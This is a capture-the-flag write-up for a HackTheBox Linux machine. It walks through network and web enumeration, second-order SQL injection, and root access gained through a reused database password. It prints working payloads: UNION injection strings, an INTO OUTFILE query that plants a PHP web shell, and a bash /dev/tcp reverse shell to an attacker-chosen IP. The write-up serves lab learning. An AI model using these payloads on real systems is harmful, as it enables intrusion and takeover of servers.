![Screenshot 2024-12-11 100408](https://github.com/user-attachments/assets/bedac851-7cd6-480e-9085-ac0f40137276)# Validation Easy Linux Machine From HackTheBox Write up
<div align="center">
  <img src=https://github.com/user-attachments/assets/12a11652-02c6-4258-ac3c-c6ef6e81149f>
</div>
</br>
  
## Machine Description
Easy linux machine with Second-order SQL Injection vulnerability and reuse password.

## Vulnerability Found
1. Second-order SQL Injection
2. Permission to write a file using SQL query and save it in a directory
3. Reuse password

## Step to Reproduce

### Enumeration

### Network Enumeration

I used `nmap` to do a network enumaration. From enumerating the network, I found several services that are opened.

<div align="center">
  <img src=https://github.com/user-attachments/assets/7df17b14-1292-4e03-a9c9-6f1c4d73f061>
</div>
</br>

<div align="center">
  Nmap Output
</div>

From the picture above, the services that were opened are **SSH** in **port 22**, **HTTP** in **port 80** and **port 8080**.

### Web Enumeration

From finding out there are HTTP service with port 80, I was directly opened the web. 

<div align="center">
  <img src=https://github.com/user-attachments/assets/513d602a-7774-4b99-b7c1-df5826e27d00>
</div>
</br>

<div align="center">
   Web home page
</div>

When i tried to input a test input to see what how this web works, turns out after I registered, the web directed me to another directory which is `account.php`.

<div align="center">
  <img src=https://github.com/user-attachments/assets/b23fd352-0ffa-4727-915f-7739b1e16d2d>
</div>
</br>

<div align="center">
   Account.php page
</div>

From here, I had an assumption that on the backend, account.php could be using some SQL query to find all the players in that has certain country, which in this case is Brazil.

Next, using Burpsuite, I repeat the registration process but this time I intercepted them first before sending it to the server. I added `'` after the country parameter like this `country=Brazil'`. 

The `'` input made the database returned an error like this:

<div align="center">
  <img src=https://github.com/user-attachments/assets/a52daade-1e36-4797-b046-6d8986605f3e>
</div>
</br>

<div align="center">
  Database error message
</div>

My assumption was right. This web is vulnerable to SQL Injection, which more specifically is Second-order SQL Injection because the thing that we input are used in later/different part.

### Exploitation

To exploit this, first I needed to know how many column does the database return. So, I used UNION SQL Injection to do this. 

Payload

    ' UNION SELECT NULL-- -

<div align="center">
  <img src=https://github.com/user-attachments/assets/e8305a7f-c2ef-4369-a697-51e96c68f71a>
</div>
</br>

<div align="center">
  Union SQL Injection finding the number of column returned
</div>

Next, I added another `NULL` but it returned me an error. So, I knew that the database only return a column. Next, finding out whether that column returned a string or another type of data.

Payload:

    ' UNION SELECT 'a'-- -

With that payload, the database returned an 'a' string which tells me that the column indeed returning a string data type.

This is where I got into confusion because my lack of skill. At first, I thought I needed to find the admin user password and use it for something. Because of this, I found the table name and column name. Turns out, it was something else.

I needed to read the official walkthrough from HackTheBox. This is where I learn something new. I learned that we can write a file using SQL query and the database somehow will write it and save the file in the desired path. 

From the official walkthrough, it directly told that I needed to make a SQL query to write some php file with php command to get cmd command from the url query. I learned another thing that we can see current user (or database I didn't really understand) could have a permission to write a file by finding it out with some SQL query function.

Next, after I found out about that, I followed along on the official walkthrough.

Payload:

    ' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -

That payload will create a php file with the php code in it. Next, I tried to curl the request.

Payload:

    ' curl http://target-machine/your-file-name.php?cmd=id

<div align="center">
  <img src=https://github.com/user-attachments/assets/32533afd-eafc-4496-a49c-5861a9577902>
</div>
</br>

<div align="center">
  id command
</div>

It worked! Next, I tried to input a cmd to do reverse shell and set up a `netcat` listner to get the reverse shell.

Payload:

    ' curl target-machine/your-file-name.php  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/your-vpn-ip/your-port 0>&1"'

With that payload, I got the reverse shell and found the user.txt


<div align="center">
  <img src=https://github.com/user-attachments/assets/badcbfed-dbff-4746-afb2-2232e39852e2>
</div>
</br>

<div align="center">
  user.txt
</div>

### Privilege Escelation

To do privesc, I searched the folder within the server and found a `config.php` containing a password for database. The file was in `/var/www/html`.

<div align="center">
  <img src=https://github.com/user-attachments/assets/2883f4d6-cc9c-436a-9579-053e4252cd2a>
</div>
</br>

<div align="center">
  password for database in config.php
</div>

I tried to do superuser into root using this password with `su root` command. It worked! Then I moved into `/root` directory and found the root.txt

<div align="center">
  <img src=https://github.com/user-attachments/assets/989625ed-7bc7-4062-852a-892e609217cc>
</div>
</br>

<div align="center">
  root.txt
</div>

Thanks for reading!
